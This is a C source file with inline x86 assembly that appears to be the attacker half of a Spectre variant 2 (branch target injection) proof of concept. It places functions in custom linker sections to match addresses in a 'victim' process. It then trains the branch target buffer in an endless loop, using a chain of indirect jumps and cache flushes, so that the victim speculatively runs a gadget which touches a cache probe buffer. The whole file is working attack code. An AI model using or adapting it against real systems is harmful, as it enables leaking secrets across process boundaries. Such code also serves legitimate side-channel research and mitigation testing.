#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>

//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));


uint8_t probe_buf[10*4096];

/*
 * This is the target of the indirect call
 * which we locate at the address of a gadget
 * in the "victim" process we are trying to
 * (mis)train the processor's BTB to call
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
    asm volatile( "movb (%%rbx), %%al\n" :: "b"((uint8_t*)&probe_buf[5*4096]) : "rax");
}

void __attribute__((section (".fnptr"))) (*fn_ptr)(void); // we'll set this = target_fn, and cflush it
uint64_t jmp_ptr;

uint64_t jmp_offsets_table[32*4096];

// Place this at the address of the function that will be doing an indirect call
// (measure)
void indirect(void) __attribute__((section(".indirect")));
void indirect(void) {
    // do our indirect jump
    // 16 taken (conditional?) branches...
    // HACK: relative jmp is 2 bytes (74 00 is "je foo\nfoo:")
    // If you want these to all be taken, set rax=0x11
    // otherwise there will be 16 not-taken branches
    asm volatile (
            "jmp call_get_rip\n"
        "get_rip:\n"
            "pop %%rax\n"
            "push %%rax\n"
            "ret\n"
        "call_get_rip:\n"
            "call get_rip\n"
            // Now we have rip in rax
            //1
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //2
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //3
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //4
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //5
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //6
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //7
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //8
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //9
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //10
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //11
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 12
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 13
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 14
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //15
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //16
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //...
            //1
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //2
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //3
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //4
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //5
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //6
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //7
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //8
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //9
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //10
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //11
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 12
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 13
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 14
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //15
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //16
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"

            :: "b"(jmp_offsets_table) : "rax");


    // Do indirect jump
    (*fn_ptr)();
}


void train()
{
    fn_ptr = target_fn;
    jmp_ptr = 0x400a5d;
    int j;
    while (1) {
        _mm_clflush(fn_ptr);
        _mm_clflush(&jmp_ptr);
        /*
        for (j=0; j<32; j++) {
            _mm_clflush(&jmp_offsets_table[j*4096]);
        }
        */
        indirect();
        //usleep(10);
    }
}


void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{
    uint64_t x;

    int i;
    for (i=0; i<32; i++) {
        jmp_offsets_table[i*4096] = 2*12;
    }
    //printf("funcfoo = %p\n", funcfoo);
    //printf("funcfoo = %p\n", funcbar);
    printf("&x = %p\n", &x);

    fn_ptr = target_fn;
    printf("&fn_ptr = %p\n", &fn_ptr);
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);
    printf("target_fn = %p\n", target_fn);

    printf("training...\n");

    train();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
